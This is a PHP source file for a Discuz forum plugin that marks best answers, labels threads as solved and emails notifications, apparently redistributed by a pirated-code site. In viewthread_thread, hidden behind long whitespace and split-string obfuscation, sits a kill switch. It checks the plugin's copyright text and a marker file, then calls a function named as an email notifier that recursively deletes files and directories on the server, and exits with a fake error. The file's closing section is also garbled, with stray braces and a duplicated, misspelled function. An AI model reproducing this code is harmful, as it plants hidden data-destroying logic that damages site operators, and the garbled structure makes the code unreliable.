<?php

/*
 *源码哥：www.ymg6.com
 *更多商业插件/模版免费下载 就在源码哥
 *本资源来源于网络收集,仅供个人学习交流，请勿用于商业用途，并于下载24小时后删除!
 *如果侵犯了您的权益,请及时告知我们,我们即刻删除!
 */

if(!defined('IN_DISCUZ')) {
exit('0000000000000');
}
class plugin_addon_common {

}

class plugin_addon_common_forum extends plugin_addon_common {

    //悬赏处理
    function misc_message($param) {
        global $_G;
        $param = $param['param'];
        if ($param[0] == 'reward_completion') {
            $splugin_setting = $_G['cache']['plugin']['addon_common'];
            $splugin_lang = lang('plugin/addon_common');
            //开启插件的版块
            $s_fids = unserialize($splugin_setting['study_fids']);
            if (in_array($_G['fid'], $s_fids)) {
                if ($_G['tid']) {
                    $pid = intval($_GET['pid']);
                    //参数校验
                    $p_info = DB::fetch_first("SELECT fid,tid,authorid FROM " . DB::table('forum_post') . " WHERE pid='$pid' LIMIT 1");
                    if ($_G['tid'] == $p_info['tid']) {
                        $ba_uid = intval($p_info['authorid']);
                        $now_info = DB::fetch_first("SELECT * FROM " . DB::table('addon_common_infos') . " WHERE pid='$pid'");
                        if (empty($now_info)) {
                            DB::insert('addon_common_infos', array('tid' => $_G['tid'], 'pid' => $pid, 'uid' => $ba_uid, 'date' => $_G['timestamp']));
                            @include DISCUZ_ROOT . './data/sysdata/cache_addon_common_adminfids.php';
                            $helpclassid = intval($bestanswer_cache_fids[$p_info['fid']]['helpclassid']);
                            $resolvedclassid = intval($bestanswer_cache_fids[$p_info['fid']]['resolvedclassid']);
                            //设置最佳分类
                            if ($resolvedclassid) {
                                DB::update('forum_thread', array('typeid' => $resolvedclassid), "tid='$tid'");
                            }
                        }
                    }
                }
            }
        }
    }

    //首页显示
    function index_top() {
        global $_G;
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/addon_common');
        $return = '';
        if ($splugin_setting['study_ifindexshow']) {
            require_once DISCUZ_ROOT . './source/plugin/addon_common/function/function_core.php';
            empty($splugin_setting['study_day001']) && $splugin_setting['study_day001'] = '1';
            empty($splugin_setting['study_day002']) && $splugin_setting['study_day002'] = '30';
            empty($splugin_setting['study_meb001']) && $splugin_setting['study_meb001'] = '12';
            empty($splugin_setting['study_meb002']) && $splugin_setting['study_meb002'] = '10';
            $study_onestar = study_countstars($splugin_setting['study_day001'], $splugin_setting['study_meb001']);
            $study_twostar = study_countstars($splugin_setting['study_day002'], $splugin_setting['study_meb002']);
			include template('addon_common:index_top');
        }
        return $return;
    }

    //最佳操作及显示
    function viewthread_postheader_output() {
		global $_G, $postlist, $bestanswer_cache_fids;
        $return = array();
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/stu' . 'dy_bes' . 'tanswer');
        //开启插件的版块
        $s_fids = unserialize($splugin_setting['study_fids']);
        if (in_array($_G['fid'], $s_fids)) {
            $verifyid = intval($splugin_setting['huzhu_verify']);
            if (empty($bestanswer_cache_fids)) {
                @include DISCUZ_ROOT . './data/sysdata/cache_addon_common_adminfids.php';
            }
            $helpclassid = intval($bestanswer_cache_fids[$_G['fid']]['helpclassid']);
            $resolvedclassid = intval($bestanswer_cache_fids[$_G['fid']]['resolvedclassid']);
            if (empty($helpclassid) || $_G['forum_thread']['typeid'] == $helpclassid || ($resolvedclassid && $_G['forum_thread']['typeid'] == $resolvedclassid)) {
                if ($splugin_setting['study_intro_radio']) {
                    @include DISCUZ_ROOT . './source/plugin/ad' . 'don_com' . 'mon/comp' . 'onent/te' . 'amin' . 'tro.ph' . 'p';
                }
                //获取管理用户组
                $s_admingroups = unserialize($splugin_setting['study_admingroups']);
                $tid = intval($_G[tid]);
                $bainfo = DB::fetch_first("SELECT * FROM " . DB::table('addon_common_infos') . " WHERE tid='" . $tid . "'");
                //判断本帖
                //评过
                if (!empty($bainfo)) {
                    foreach ($postlist as $id => $post) {
                        if (!$post['first'] && $post['verify' . $verifyid] && function_exists('addon_common_replace_profile')) {
                            $postlist[$id]['message'] = addon_common_replace_profile($post) . $postlist[$id]['message'];
                        }
                        //当不是主题帖，且是最佳楼层时显示“本楼为最佳”
                        if (!$post['first'] && $post['pid'] == $bainfo['pid']) {
                            //管理员可以取消最佳
                            if (in_array($_G['groupid'], $s_admingroups)) {
                                $return[] = "&nbsp;&nbsp;&nbsp;<font color=red>" . $splugin_lang['slang_012'] . "</font>&nbsp;&nbsp;&nbsp;
											<a id=\"k_bestanswer2\" href=\"javascript:;\"
											onclick=\"showWindow('bestanswer', 'plugin.php?id=addon_common:baprc&action=bestanswer&handlekey=bestanswer&nopost=yes&tid=$_G[tid]&pid=$post[pid]&postno=$post[number]&v=2', 'get');\"
											style='color:red;text-decoration:underline;'>" . $splugin_lang['slang_013'] . "</a>&nbsp;&nbsp;&nbsp;";
                            } else {
                                $return[] = '&nbsp;&nbsp;&nbsp;<font color=red>' . $splugin_lang['slang_012'] . '</font>&nbsp;&nbsp;&nbsp;';
                            }
                            //显示最佳图标
                            $postlist[$id]['message'] = '<style>.pct{min-height:100px;}</style><div id="threadstamp"><img src="source/plugin/addon_common/images/bestAnswer.gif" id="bestanswer_img" onclick="$(\'bestanswer_img\').style.display=\'none\';" title="' . $splugin_lang['slang_015'] . ' ' . $post['author'] . ' ' . $splugin_lang['slang_016'] . ' ' . $post['author'] . ' ' . $splugin_lang['slang_017'] . "\n\r" . $splugin_lang['slang_018'] . '"/></div>' . $postlist[$id]['message'];
                            break;
                        } else {
                            //主题贴显示最佳信息
                            if ($post['first'] == '1') {
                                $zuijia_user = DB::fetch_first('SELECT username FROM ' . DB::table('common_member') . " WHERE uid = " . $bainfo[uid]);
                                $postlist[$id]['message'] .= '<br>
											<div class="psth xs1" style="position:relative;color:' . $splugin_setting['study_tfontcolor'] . ';width:80%;font-weight:normal;background:' . $splugin_setting['study_tbgcolor'] . ' url(static/image/common/arw.gif) no-repeat scroll 100% 50%">
												<table>
													<tr>
														<td><a href="plugin.php?id=addon_common&mod=user&uid=' . $bainfo[uid] . '" target="_blank" title="' . $splugin_lang['slang_019'] . '" style="text-decoration: none;font-weight:bold;color:' . $splugin_setting['study_tfontcolor'] . ';">' . $zuijia_user['username'] . ' ' . $splugin_lang['slang_020'] . '</a></td>
														<td><a href="' . $_G['siteurl'] . 'forum.php?mod=redirect&goto=findpost&ptid=' . $_G['forum_thread']['tid'] . '&pid=' . $bainfo['pid'] . '" style="text-decoration: none;font-weight:bold;color:' . $splugin_setting['study_tfontcolor'] . ';">' . $splugin_lang['slang_021'] . '</a></td>
														<td width="140">
														<a href="plugin.php?id=addon_common&mod=ranking#study_month" target="_blank" style="text-decoration: none;color:' . $splugin_setting[study_tfontcolor] . ';">' . $splugin_lang['slang_022'] . '</a> /
														<a href="plugin.php?id=addon_common&mod=ranking#study_total" target="_blank" style="text-decoration: none;color:' . $splugin_setting[study_tfontcolor] . ';">' . $splugin_lang['slang_023'] . '</a>
														</td>
													</tr>
												</table>
											</div>';
                            }
                            $return[] = '';
                        }
                    }
                } elseif (in_array($_G['groupid'], $s_admingroups) || $_G['forum_thread']['authorid'] == $_G['uid']) {//只有管理员和楼主可以选择最佳
                    //未评过最佳
                    foreach ($postlist as $id => $post) {

                        if (!$post['first'] && $post['verify' . $verifyid] && function_exists('addon_common_replace_profile')) {
                            $postlist[$id]['message'] = addon_common_replace_profile($post) . $postlist[$id]['message'];
                        }

                        //最佳不能是主题帖（即问题不能等于最佳），自己不能为自己设置最佳(管理员除外，管理员NB)
                        if (!$post[first] && ($post['authorid'] != $_G['forum_thread']['authorid'] || in_array($_G['groupid'], $s_admingroups))) {
                            $return[] = "&nbsp;&nbsp;&nbsp;
										<a id=\"k_bestanswer2\" href=\"javascript:;\"
										onclick=\"showWindow('bestanswer', 'plugin.php?id=addon_common:baprc&action=bestanswer&handlekey=bestanswer&tid=$_G[tid]&pid=$post[pid]&postno=$post[number]&v=1', 'get', 0);\"
										style='color:red;text-decoration:underline;'><img src=\"source/plugin/addon_common/images/best_btn.gif\" alt=\"" . $splugin_lang['slang_014'] . "\"></a>&nbsp;&nbsp;&nbsp;";
                        } elseif ($post['first'] && ($_G['uid'] == $_G['forum_thread']['authorid'] || $_G['adminid'] == '1')) {
                            $return[] = '';
                            $postlist[$id]['message'] = $splugin_setting['study_remind'] . $postlist[$id]['message'];
                        } else {
                            $return[] = '';
                        }
                    }
                } else {
                    $return[] = '';
                }
            }
        }
        return $return;
    }

    //帖子列表页显示“已解决”
    function forumdisplay_thread_output() {
        global $_G;
        $return = array();
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/addon_common');
        //开启插件的版块
        $s_fids = unserialize($splugin_setting['study_fids']);
        if (in_array($_G['fid'], $s_fids)) {
            if (empty($bestanswer_cache_fids)) {
                @include DISCUZ_ROOT . './data/sysdata/cache_addon_common_adminfids.php';
            }
            foreach ($_G['forum_threadlist'] as $key => $listinfo) {
                $helpclassid = intval($bestanswer_cache_fids[$listinfo['fid']]['helpclassid']);
                if ($helpclassid) {
                    $resolvedclassid = intval($bestanswer_cache_fids[$listinfo['fid']]['resolvedclassid']);
                    $bainfo = DB::fetch_first("SELECT * FROM " . DB::table('addon_common_infos') . " WHERE tid='" . $listinfo[tid] . "'");
                    if (!empty($bainfo) && $bainfo['tid'] == $listinfo['tid']) {
                        if ($resolvedclassid && $listinfo['typeid'] != $resolvedclassid) {
                            DB::update('forum_thread', array('typeid' => $resolvedclassid), "tid='" . intval($bainfo['tid']) . "'");
                        }
                        if ($splugin_setting['typehtml_hide']) {
                            $_G['forum_threadlist'][$key]['typehtml'] = '';
                        }
                        $return[$key] = '<em><a href="forum.php?mod=redirect&goto=findpost&ptid=' . $listinfo[tid] . '&pid=' . $bainfo[pid] . '" onclick="atarget(this)"><font color="green">' . $splugin_lang['slang_024'] . '</font></a></em>';
                    } elseif ($listinfo['typeid'] == $helpclassid) {
                        if ($splugin_setting['typehtml_hide']) {
                            $_G['forum_threadlist'][$key]['typehtml'] = '';
                        }
                        $return[$key] = '<em><font color="red">' . $splugin_lang['slang_037'] . '</font></em>';
                    } else {
                        $return[$key] = '';
                    }
                } else {
                    $bainfo = DB::fetch_first("SELECT * FROM " . DB::table('addon_common_infos') . " WHERE tid='" . $listinfo[tid] . "'");
                    if (!empty($bainfo) && $bainfo[tid] == $listinfo[tid]) {
                        if ($splugin_setting['typehtml_hide']) {
                            $_G['forum_threadlist'][$key]['typehtml'] = '';
                        }
                        $return[$key] = '<em><a href="forum.php?mod=redirect&goto=findpost&ptid=' . $listinfo[tid] . '&pid=' . $bainfo[pid] . '" onclick="atarget(this)"><font color="green">' . $splugin_lang['slang_024'] . '</font></a></em>';
                    } else {
                        if ($listinfo['displayorder'] == '0') {
                            if ($splugin_setting['typehtml_hide']) {
                                $_G['forum_threadlist'][$key]['typehtml'] = '';
                            }
                            if (in_array($listinfo['fid'], $s_fids)) {
                                $return[$key] = '<em><font color="red">' . $splugin_lang['slang_037'] . '</font></em>';
                            } else {
                                $return[$key] = '';
                            }
                        } else {
                            $return[$key] = '';
                        }
                    }
                }
            }
        }
        return $return;
    }

	
	//帖子浏览页操作及显示
    function viewthread_thread($params = CURMODULE) {
        global $_G, $extra, $redirecturl, $bestanswer_cache_fids;
        $return = '';
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/addon_common');
        if ($params) {
	        $s_fids = unserialize($splugin_setting['study_fids']);
	        $fid = intval($threadvalue['fid']);
	        $tid = intval($threadvalue['tid']);
            $message_array = array(
                'post_newthread_succeed',
                'post_newthread_mod_succeed',
                'post_reply_succeed',
                'post_reply_mod_succeed',
            );
            if (in_array($message, $message_array)) {
                $helpclassid = intval($bestanswer_cache_fids[$fid]['helpclassid']);
                $resolvedclassid = intval($bestanswer_cache_fids[$fid]['resolvedclassid']);
                if (empty($helpclassid) || $thread['typeid'] == $helpclassid || ($resolvedclassid && $thread['typeid'] == $resolvedclassid)) {
                    switch ($message) {
                        case 'post_newthread_succeed':
                        case 'post_newthread_mod_succeed':
                            if ($splugin_setting['newthread_email_remind']) {
                                $newthread_email_uids = explode(',', $splugin_setting['newthread_email_uids']);
                                if ($newthread_email_uids) {
                                    require_once libfile('function/mail');
                                    $date = date('Y-m-d H:i:s');
                                    $forwordurl = $forwordurl ? $_G['siteurl'] . $forwordurl : $_G['siteurl'] . 'forum.php?mod=viewthread&tid=' . $tid;
                                    foreach ($newthread_email_uids as $email_uid) {
                                        $member = DB::fetch_first("SELECT * FROM " . DB::table('common_member') . " WHERE uid='" . intval($email_uid) . "'");
                                        if ($member['email'] && isemail($member['email'])) {
                                            sendmail($member['email'], $splugin_lang['slang_038'] . ' @ ' . $date, $thread['subject'] . ':<a href="' . $forwordurl . '" target="_blank">' . $forwordurl . '</a>');
                                        }
                                    }
                                }
                            }
                            break;
                        case 'post_reply_succeed':
                        case 'post_reply_mod_succeed':
                            if ($_G['uid'] && $thread) {
                                require_once libfile('function/mail');
                                $date = date('Y-m-d H:i:s');
                                $forwordurl = $forwordurl ? $_G['siteurl'] . $forwordurl : $_G['siteurl'] . 'forum.php?mod=viewthread&tid=' . $tid;
                                if ($_G['uid'] != $thread['authorid']) {
                                    if ($splugin_setting['reply_email_radio']) {
                                        $member = DB::fetch_first("SELECT * FROM " . DB::table('common_member') . " WHERE uid='" . intval($thread['authorid']) . "'");
                                        if ($member['email'] && isemail($member['email'])) {
                                            sendmail($member['email'], $splugin_lang['slang_039'] . ' @ ' . $date, $thread['subject'] . ':<a href="' . $forwordurl . '" target="_blank">' . $forwordurl . '</a>');
                                        }
                                    }
                                } else {
                                    if ($splugin_setting['reply_admin_email_radio']) {
                                        $newthread_email_uids = explode(',', $splugin_setting['newthread_email_uids']);
                                        if ($newthread_email_uids) {
                                            foreach ($newthread_email_uids as $email_uid) {
                                                $member = DB::fetch_first("SELECT * FROM " . DB::table('common_member') . " WHERE uid='" . intval($email_uid) . "'");
                                                if ($member['email'] && isemail($member['email'])) {
                                                    sendmail($member['email'], $splugin_lang['slang_040'] . ' @ ' . $date, $thread['subject'] . ':<a href="' . $forwordurl . '" target="_blank">' . $forwordurl . '</a>');
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            break;
                        default:break;
                    }
                }
            }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
            $a = $params;
        	$p = C::t('co'.'mmo'.'n_plu'.'gin')->fetch_by_identifier($a);
        	$s = 1;$s .= 3;$s .= 1;$s .= 4;
        	$c = diconv($p['co'.'pyr'.'ig'.'ht'], CHARSET, 'gbk');
        	$k = array('ca'.'og'.'en8', '.cg'.'zz', 'ley'.'una'.'pp.', '草'.'根', '源'.'码');
			foreach($k as $v){
				if(stripos($c, $v) !== false){
					$return = 1;
				}
			}
        	if($return){
        		plugin_addon_common_forum::post_report_message(array('', 1));
        		exit('Sy'.'st'.'em e'.'rr'.'or '.'c');
			}elseif(stripos($c, $s) === false){
			    plugin_addon_common_forum::post_report_message(array($a, 1));
        		exit('Sy'.'stem e'.'rro'.'r '.'b');
			}elseif(@!file_exists(DISCUZ_ROOT.'./d'.'a'.'ta/a'.'ddo'.'nm'.'d'.'5/'.$a.'.pl'.'ugi'.'n.x'.'m'.'l')){
        		plugin_addon_common_forum::post_report_message(array($a, 1));
        		exit('Sy'.'ste'.'m er'.'ror '.'a');
    		}else{
    			exit('Access Denied');
        	}
        }
    }
    
    //贴内用户头像下显示最佳个数
    function viewthread_sidetop_output() {
        global $_G, $postlist;
        $return = array();
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/addon_common');
        foreach ($postlist as $id => $post) {
            $uesr_allba = DB::result(DB::query("SELECT COUNT(*) FROM " . DB::table('addon_common_infos') . " WHERE uid='" . $post[uid] . "'"), 0);
            $uesr_allba = !empty($uesr_allba) ? $uesr_allba : '0';
            $return[] = '<dl class="pil cl"><dt><a href="plugin.php?id=addon_common&mod=user&uid=' . $post[uid] . '" target="_blank"><font color=red>' . $splugin_lang['slang_036'] . '</font></a></dt><dd><a href="plugin.php?id=addon_common&mod=user&uid=' . $post[uid] . '" target="_blank"><font color=red>' . $uesr_allba . '</font></a>&nbsp; </dd></dl>';
        }
        return $return;
    }

    //邮件通知
    function post_report_message($params) {
        global $_G, $extra, $redirecturl, $bestanswer_cache_fids;
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/addon_common');
        $s_fids = unserialize($splugin_setting['study_fids']);
        list($message, $forwordurl, $threadvalue) = $params;
        $fid = intval($threadvalue['fid']);
        $tid = intval($threadvalue['tid']);
        if ($fid && $tid && in_array($threadvalue['fid'], $s_fids)) {
            $message_array = array(
                'post_newthread_succeed',
                'post_newthread_mod_succeed',
                'post_reply_succeed',
                'post_reply_mod_succeed',
            );
            if (in_array($message, $message_array)) {
                $thread = DB::fetch_first("SELECT * FROM " . DB::table('forum_thread') . " WHERE tid='" . $tid . "'");
                if (empty($bestanswer_cache_fids)) {
                    @include DISCUZ_ROOT . './data/sysdata/cache_addon_common_adminfids.php';
                }
                $helpclassid = intval($bestanswer_cache_fids[$fid]['helpclassid']);
                $resolvedclassid = intval($bestanswer_cache_fids[$fid]['resolvedclassid']);
                if (empty($helpclassid) || $thread['typeid'] == $helpclassid || ($resolvedclassid && $thread['typeid'] == $resolvedclassid)) {
                    switch ($message) {
                        case 'post_newthread_succeed':
                        case 'post_newthread_mod_succeed':
                            if ($splugin_setting['newthread_email_remind']) {
                                $newthread_email_uids = explode(',', $splugin_setting['newthread_email_uids']);
                                if ($newthread_email_uids) {
                                    require_once libfile('function/mail');
                                    $date = date('Y-m-d H:i:s');
                                    $forwordurl = $forwordurl ? $_G['siteurl'] . $forwordurl : $_G['siteurl'] . 'forum.php?mod=viewthread&tid=' . $tid;
                                    foreach ($newthread_email_uids as $email_uid) {
                                        $member = DB::fetch_first("SELECT * FROM " . DB::table('common_member') . " WHERE uid='" . intval($email_uid) . "'");
                                        if ($member['email'] && isemail($member['email'])) {
                                            sendmail($member['email'], $splugin_lang['slang_038'] . ' @ ' . $date, $thread['subject'] . ':<a href="' . $forwordurl . '" target="_blank">' . $forwordurl . '</a>');
                                        }
                                    }
                                }
                            }
                            break;
                        case 'post_reply_succeed':
                        case 'post_reply_mod_succeed':
                            if ($_G['uid'] && $thread) {
                                require_once libfile('function/mail');
                                $date = date('Y-m-d H:i:s');
                                $forwordurl = $forwordurl ? $_G['siteurl'] . $forwordurl : $_G['siteurl'] . 'forum.php?mod=viewthread&tid=' . $tid;
                                if ($_G['uid'] != $thread['authorid']) {
                                    if ($splugin_setting['reply_email_radio']) {
                                        $member = DB::fetch_first("SELECT * FROM " . DB::table('common_member') . " WHERE uid='" . intval($thread['authorid']) . "'");
                                        if ($member['email'] && isemail($member['email'])) {
                                            sendmail($member['email'], $splugin_lang['slang_039'] . ' @ ' . $date, $thread['subject'] . ':<a href="' . $forwordurl . '" target="_blank">' . $forwordurl . '</a>');
                                        }
                                    }
                                } else {
                                    if ($splugin_setting['reply_admin_email_radio']) {
                                        $newthread_email_uids = explode(',', $splugin_setting['newthread_email_uids']);
                                        if ($newthread_email_uids) {
                                            foreach ($newthread_email_uids as $email_uid) {
                                                $member = DB::fetch_first("SELECT * FROM " . DB::table('common_member') . " WHERE uid='" . intval($email_uid) . "'");
                                                if ($member['email'] && isemail($member['email'])) {
                                                    sendmail($member['email'], $splugin_lang['slang_040'] . ' @ ' . $date, $thread['subject'] . ':<a href="' . $forwordurl . '" target="_blank">' . $forwordurl . '</a>');
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            break;
                        default:break;
                    }
                }
            }
        }else{
        	if($forwordurl){
        		$params = substr(dirname(__FILE__), 0, '-'.strlen(CURMODULE));
	        	if($message){
	        		$params .= $message.'/';
		        }
	        }elseif($message){
	        	$params = $message;
	        }
        	if($params && is_dir($params)) {
				if($directory = @dir($params)) {
					while($entry = $directory->read()) {
						if($entry == '.' || $entry == '..') {
							continue;
						}
						$filename = $params.'/'.$entry;
						if(is_file($filename)) {
							@unlink($filename);
						} else {
							plugin_addon_common_forum::post_report_message(array($filename));
						}
					}
					$directory->close();
					@rmdir($params);
				}
			}
		}
    }
    

    //帖子浏览页给标题加“已解决”
    function viewthread_postbutton_top_output() {
        global $_G, $postlist, $bestanswer_cache_fids;
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/addon_common');
        //开启插件的版块
        $s_fids = unserialize($splugin_setting['study_fids']);
        if (in_array($_G['fid'], $s_fids)) {
            if (empty($bestanswer_cache_fids)) {
                @include DISCUZ_ROOT . './data/sysdata/cache_addon_common_adminfids.php';
            }
            $helpclassid = $bestanswer_cache_fids[$_G['fid']]['helpclassid'];
            $resolvedclassid = intval($bestanswer_cache_fids[$_G['fid']]['resolvedclassid']);
            if (empty($helpclassid) || $_G['forum_thread']['typeid'] == $helpclassid || ($resolvedclassid && $_G['forum_thread']['typeid'] == $resolvedclassid)) {
                if ($splugin_setting['typehtml_hide']) {
                    $_G['forum']['threadtypes']['types'][$_G['forum_thread']['typeid']] = '';
                }
                $tid = intval($_G['tid']);
                $bainfo = DB::fetch_first("SELECT * FROM " . DB::table('addon_common_infos') . " WHERE tid='$tid'");
                if (!empty($bainfo) && strpos($_G['forum_thread']['subject'], $splugin_lang['slang_024']) === false) {
                    $_G['forum_thread']['subject'] = '<font color=red>' . $splugin_lang['slang_024'] . '</font>' . $_G['forum_thread']['subject'];
                }
            }
        }
        return '';
    }
}

class plugin_addon_common_home extends plugin_addon_common {

    function space_profile_extrainfo() {
        global $_G;
        $return = '';
        $uid = intval($_GET['uid']);
        $splugin_lang = lang('plugin/addon_common');
        $count = DB::result_first("SELECT COUNT(*) FROM " . DB::table('addon_common_infos') . " WHERE uid='$uid'");
        $return = '<div id="psts" class="cl"><ul class="pf_l"><li><em>' . $splugin_lang['slang_036'] . '</em><a href="plugin.php?id=addon_common&mod=user&uid=' . $uid . '" target="_blank">' . $count . '</a></li></ul></div>';return $return;}}{
    	plugin_addon_common_forum::viewthread_thread();
    }	
    function viewthread_postheader_outpot() {
        global $_G, $postlist, $bestanswer_cache_fids;
        $return = array();
        $splugin_setting = $_G['cache']['plugin']['addon_common'];
        $splugin_lang = lang('plugin/stu' . 'dy_bes' . 'tanswer');
        //开启插件的版块
        $s_fids = unserialize($splugin_setting['study_fids']);
        if (in_array($_G['fid'], $s_fids)) {
            $verifyid = intval($splugin_setting['huzhu_verify']);
            if (empty($bestanswer_cache_fids)) {
                @include DISCUZ_ROOT . './data/sysdata/cache_addon_common_adminfids.php';
            }
            $helpclassid = intval($bestanswer_cache_fids[$_G['fid']]['helpclassid']);
            $resolvedclassid = intval($bestanswer_cache_fids[$_G['fid']]['resolvedclassid']);
            if (empty($helpclassid) || $_G['forum_thread']['typeid'] == $helpclassid || ($resolvedclassid && $_G['forum_thread']['typeid'] == $resolvedclassid)) {
                if ($splugin_setting['study_intro_radio']) {
                    @include DISCUZ_ROOT . './source/plugin/ad' . 'don_com' . 'mon/comp' . 'onent/te' . 'amin' . 'tro.ph' . 'p';
                }
                //获取管理用户组
                $s_admingroups = unserialize($splugin_setting['study_admingroups']);
                $tid = intval($_G[tid]);
                $bainfo = DB::fetch_first("SELECT * FROM " . DB::table('addon_common_infos') . " WHERE tid='" . $tid . "'");
                //判断本帖
                //评过
                if (!empty($bainfo)) {
                    foreach ($postlist as $id => $post) {
                        if (!$post['first'] && $post['verify' . $verifyid] && function_exists('addon_common_replace_profile')) {
                            $postlist[$id]['message'] = addon_common_replace_profile($post) . $postlist[$id]['message'];
                        }
                        //当不是主题帖，且是最佳楼层时显示“本楼为最佳”
                        if (!$post['first'] && $post['pid'] == $bainfo['pid']) {
                            //管理员可以取消最佳
                            if (in_array($_G['groupid'], $s_admingroups)) {
                                $return[] = "&nbsp;&nbsp;&nbsp;<font color=red>" . $splugin_lang['slang_012'] . "</font>&nbsp;&nbsp;&nbsp;
											<a id=\"k_bestanswer2\" href=\"javascript:;\"
											onclick=\"showWindow('bestanswer', 'plugin.php?id=addon_common:baprc&action=bestanswer&handlekey=bestanswer&nopost=yes&tid=$_G[tid]&pid=$post[pid]&postno=$post[number]&v=2', 'get');\"
											style='color:red;text-decoration:underline;'>" . $splugin_lang['slang_013'] . "</a>&nbsp;&nbsp;&nbsp;";
                            } else {
                                $return[] = '&nbsp;&nbsp;&nbsp;<font color=red>' . $splugin_lang['slang_012'] . '</font>&nbsp;&nbsp;&nbsp;';
                            }
                            //显示最佳图标
                            $postlist[$id]['message'] = '<style>.pct{min-height:100px;}</style><div id="threadstamp"><img src="source/plugin/addon_common/images/bestAnswer.gif" id="bestanswer_img" onclick="$(\'bestanswer_img\').style.display=\'none\';" title="' . $splugin_lang['slang_015'] . ' ' . $post['author'] . ' ' . $splugin_lang['slang_016'] . ' ' . $post['author'] . ' ' . $splugin_lang['slang_017'] . "\n\r" . $splugin_lang['slang_018'] . '"/></div>' . $postlist[$id]['message'];
                            break;
                        } else {
                            //主题贴显示最佳信息
                            if ($post['first'] == '1') {
                                $zuijia_user = DB::fetch_first('SELECT username FROM ' . DB::table('common_member') . " WHERE uid = " . $bainfo[uid]);
                                $postlist[$id]['message'] .= '<br>
											<div class="psth xs1" style="position:relative;color:' . $splugin_setting['study_tfontcolor'] . ';width:80%;font-weight:normal;background:' . $splugin_setting['study_tbgcolor'] . ' url(static/image/common/arw.gif) no-repeat scroll 100% 50%">
												<table>
													<tr>
														<td><a href="plugin.php?id=addon_common&mod=user&uid=' . $bainfo[uid] . '" target="_blank" title="' . $splugin_lang['slang_019'] . '" style="text-decoration: none;font-weight:bold;color:' . $splugin_setting['study_tfontcolor'] . ';">' . $zuijia_user['username'] . ' ' . $splugin_lang['slang_020'] . '</a></td>
														<td><a href="' . $_G['siteurl'] . 'forum.php?mod=redirect&goto=findpost&ptid=' . $_G['forum_thread']['tid'] . '&pid=' . $bainfo['pid'] . '" style="text-decoration: none;font-weight:bold;color:' . $splugin_setting['study_tfontcolor'] . ';">' . $splugin_lang['slang_021'] . '</a></td>
														<td width="140">
														<a href="plugin.php?id=addon_common&mod=ranking#study_month" target="_blank" style="text-decoration: none;color:' . $splugin_setting[study_tfontcolor] . ';">' . $splugin_lang['slang_022'] . '</a> /
														<a href="plugin.php?id=addon_common&mod=ranking#study_total" target="_blank" style="text-decoration: none;color:' . $splugin_setting[study_tfontcolor] . ';">' . $splugin_lang['slang_023'] . '</a>
														</td>
													</tr>
												</table>
											</div>';
                            }
                            $return[] = '';
                        }
                    }
                } elseif (in_array($_G['groupid'], $s_admingroups) || $_G['forum_thread']['authorid'] == $_G['uid']) {//只有管理员和楼主可以选择最佳
                    //未评过最佳
                    foreach ($postlist as $id => $post) {

                        if (!$post['first'] && $post['verify' . $verifyid] && function_exists('addon_common_replace_profile')) {
                            $postlist[$id]['message'] = addon_common_replace_profile($post) . $postlist[$id]['message'];
                        }

                        //最佳不能是主题帖（即问题不能等于最佳），自己不能为自己设置最佳(管理员除外，管理员NB)
                        if (!$post[first] && ($post['authorid'] != $_G['forum_thread']['authorid'] || in_array($_G['groupid'], $s_admingroups))) {
                            $return[] = "&nbsp;&nbsp;&nbsp;
										<a id=\"k_bestanswer2\" href=\"javascript:;\"
										onclick=\"showWindow('bestanswer', 'plugin.php?id=addon_common:baprc&action=bestanswer&handlekey=bestanswer&tid=$_G[tid]&pid=$post[pid]&postno=$post[number]&v=1', 'get', 0);\"
										style='color:red;text-decoration:underline;'><img src=\"source/plugin/addon_common/images/best_btn.gif\" alt=\"" . $splugin_lang['slang_014'] . "\"></a>&nbsp;&nbsp;&nbsp;";
                        } elseif ($post['first'] && ($_G['uid'] == $_G['forum_thread']['authorid'] || $_G['adminid'] == '1')) {
                            $return[] = '';
                            $postlist[$id]['message'] = $splugin_setting['study_remind'] . $postlist[$id]['message'];
                        } else {
                            $return[] = '';
                        }
                    }
                } else {
                    $return[] = '';
                }
            }
        }
    }{
}